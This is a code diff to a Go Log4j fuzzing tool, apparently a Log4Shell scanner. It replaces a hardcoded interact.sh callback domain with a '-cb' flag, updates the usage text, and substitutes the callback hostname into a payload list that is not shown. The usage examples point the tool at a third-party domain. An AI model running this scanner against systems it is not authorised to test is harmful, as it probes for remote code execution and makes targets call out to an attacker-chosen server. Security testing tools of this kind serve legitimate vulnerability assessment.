@@ -85,15 +85,17 @@ func main() {
 	var d string
 	var headers []string
 	var payloads []string
+	var cb string
 	var err error
 	flag.StringVar(&d, "d", "", "Set domain/IP")
+	flag.StringVar(&cb, "cb", "", "Set callback server")
 	flag.Parse()
 
 	f := flag.NFlag()
-	if f != 1 {
-		fmt.Printf("Usage: log4j-fuzzing -d domain/IP\n")
-		fmt.Printf("Example: log4j-fuzzing -d http://google.com\n")
-		fmt.Printf("Example1: log4j-fuzzing -d \"http://google.com:8000\"\n")
+	if f != 2 {
+		fmt.Printf("Usage: log4j-fuzzing -d domain/IP -cb interact-server\n")
+		fmt.Printf("Example: log4j-fuzzing -d http://google.com -cb interact-server\n")
+		fmt.Printf("Example1: log4j-fuzzing -d \"http://google.com:8000\" -cb interact-server\n")
 		fmt.Printf("Using quote if have port")
 		return
 	}
@@ -116,7 +118,7 @@ func main() {
 	var payloads2 []string
 	num := randomNumb()
 	randN := strconv.Itoa(num)
-	hostname := randN + "." + "c7239qu1nmiqrhnc9lqgc8ndj5yyyyyyn.interact.sh"
+	hostname := randN + "." + cb
 	for _, payload := range payloads {
 		payload := strings.Replace(payload, "hostname", hostname, -1)
 		payloads2 = append(payloads2, payload)
